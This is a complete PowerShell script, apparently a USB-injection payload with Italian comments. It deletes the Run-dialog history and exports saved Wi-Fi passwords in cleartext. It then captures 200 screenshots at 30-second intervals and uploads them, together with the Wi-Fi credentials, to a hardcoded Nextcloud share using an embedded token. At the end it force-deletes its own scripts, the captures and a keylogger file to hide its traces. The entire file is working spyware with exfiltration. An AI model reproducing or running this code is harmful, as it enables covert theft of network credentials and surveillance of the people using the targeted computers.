function Nextcloud-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [string]$SourceFilePath
    ) 
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $nextcloudUrl = "https://wim.nl.tabdigital.cloud/"
    $sharetoken = 'gkj9TSrXtzxGrn4'
    
    $fileObject = Get-Item $SourceFilePath
    $headers = @{
        "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
        "X-Requested-With"="XMLHttpRequest";
    }
    # Il nome del file remoto corrisponderà al nome del file locale (con l'indice incrementale)
    $webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
    Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

# --- INIZIO OPERAZIONI ---
try {
    # 1. Pulizia cronologia comandi "Esegui"
    cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
    Remove-Item .\RunMRU\ -ErrorAction SilentlyContinue

    # 2. Export Password WiFi
    $p = "C:\wipass"
    if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory -Force }
    Set-Location $p

    netsh wlan export profile key=clear
    Get-ChildItem *.xml | ForEach-Object {
        $xml = [xml](Get-Content $_)
        $content = "========================================`r`n SSID = " + $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
        Out-File "$env:computername-wificapture.txt" -Append -InputObject $content
    }

    # Carica il report WiFi se creato
    if (Test-Path "$env:computername-wificapture.txt") {
        "$env:computername-wificapture.txt" | Nextcloud-Upload
    }

    # 3. Ciclo Screenshot con nomi incrementali
    $i = 0
    while($i -lt 200){
        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
        $screens = [Windows.Forms.Screen]::AllScreens
        
        $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
        $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
        $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
        $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

        $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

        # Nome file dinamico: Capture-0, Capture-1, ecc.
        $currentPath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"
        $bmp.Save($currentPath)
        
        $graphics.Dispose()
        $bmp.Dispose()
      
        # Caricamento immediato prima di incrementare $i o attendere
        if (Test-Path $currentPath) {
            $currentPath | Nextcloud-Upload
        }
        
        $i++
        Start-Sleep -Seconds 30
    }
}
# --- PROTEZIONE E PULIZIA FINALE ---
finally {
    # Usciamo dalla cartella wipass per sbloccarla e permetterne l'eliminazione
    Set-Location $env:TEMP

    $pathsToClean = @(
        "$env:APPDATA\c.ps1", 
        "$env:APPDATA\sg.ps1", 
        "$env:APPDATA\sg2.ps1", 
        "C:\Users\Irene\Desktop\OMG\testing\temp.txt", 
        "$env:temp\keylogger.txt", 
        "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png", # Tutti gli screenshot
        "C:\wipass" # La cartella intera dei profili WiFi
    )

    foreach($path in $pathsToClean) {
        if (Test-Path $path) {
            # -Recurse elimina le sottocartelle, -Force ignora i permessi di sola lettura
            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}
